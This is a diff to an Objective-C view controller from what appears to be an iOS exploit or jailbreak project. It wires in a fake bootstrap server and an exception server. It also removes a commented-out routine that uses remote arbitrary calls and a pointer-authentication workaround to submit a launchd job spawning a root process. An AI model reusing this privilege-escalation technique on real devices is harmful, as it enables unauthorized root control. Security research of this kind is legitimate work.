@@ -15,6 +15,7 @@
 
 @interface ViewController ()
 @property(nonatomic) mach_port_t exceptionPort;
+@property(nonatomic) mach_port_t fakeBootstrapPort;
 @property(nonatomic) pid_t childPid, sleepPid;
 @property(nonatomic) UITextView *logTextView;
 @end
@@ -27,9 +28,6 @@
     self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Options" menu:[UIMenu menuWithTitle:@"Options" children:@[
         [UIAction actionWithTitle:@"Change Signed Pointer" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
             [self changePtrTapped];
-        }],
-        [UIAction actionWithTitle:@"Test spawn root process" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
-            launchTest(@"dtsecurity");
         }]
     ]]];
     self.navigationItem.rightBarButtonItems = @[
@@ -48,6 +46,7 @@
     [self redirectStdio];
     
     self.exceptionPort = setup_exception_server();
+    self.fakeBootstrapPort = setup_fake_bootstrap_server();
     self.childPid = -1;
 }
 
@@ -110,7 +109,8 @@
         printf("Child already spawned with PID %d\n", self.childPid);
         return;
     }
-    self.childPid = spawn_exploit_process(self.exceptionPort);
+    self.childPid = 0; // TODO: get pid
+    launchTest(@"dtsecurity");
 }
 
 - (void)arbCallButtonTapped {
@@ -159,51 +159,10 @@
         printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
         RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
         
-        // Now we can submit a launch job
-//        vm_address_t root = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
-//        vm_address_t submitJob = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
-//        
-//        RemoteWriteString(map, "LaunchOnlyOnce");
-//        RemoteArbCall(xpc_dictionary_set_bool, submitJob, map, true);
-//        RemoteWriteString(map, "ExitTimeOut");
-//        RemoteArbCall(xpc_dictionary_set_int64, submitJob, map, 30);
-//        RemoteWriteString(map, "POSIXSpawnType");
-//        RemoteWriteString(map+0x100, "Interactive");
-//        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
-//        RemoteWriteString(map, "Label");
-//        RemoteWriteString(map+0x100, "com.apple.dt.instruments.dtsecurity.haxx");
-//        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
-//        RemoteWriteString(map, "Program");
-//        //RemoteWriteString(map+0x100, "/System/Library/PrivateFrameworks/DVTInstrumentsFoundation.framework/XPCServices/com.apple.dt.instruments.dtsecurity.xpc/com.apple.dt.instruments.dtsecurity");
-//        RemoteWriteString(map+0x100, "/Applications/PreBoard.app/PreBoard");
-//        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
-//        
-//        //xpc_dictionary_set_bool(simService, "ResetAtClose", true);
-//        
-//        RemoteWriteString(map, "SubmitJob");
-//        
-//        // xpc_dictionary_set_value validates PAC of lr, so use blr x19 to call it
-//        RemoteArbCallBLR(xpc_dictionary_set_value, root, map, submitJob);
-//        
-//        RemoteArbCall(xpc_release, submitJob);
-//        
-//        printf("Waiting 5 seconds before _launch_msg2...\n");
-//        sleep(5);
-//        printf("Submitting launch job...\n");
-//        //RemoteArbCall(_launch_job_routine, 0x3e8, root, ???, 0);
-//        
-//        printf("Waiting 5 seconds before detach...\n");
-//        sleep(5);
-//        RemoteDetach();
-        
-        //RemoteArbCall(munmap, map, 0x4000);
-        
-        
 //        RemoteArbCall((void*)dlopen, 0x41414141, 0);
 //        printf("--- MARK: DONE FUNCTION CALL ---\n");
 //        RemoteWriteString(map, "/tmp/.it_works");
 //        RemoteArbCall(mkdir, map, 0700);
-        
         
         // submit a launch job to launchd to spawn a root process
         
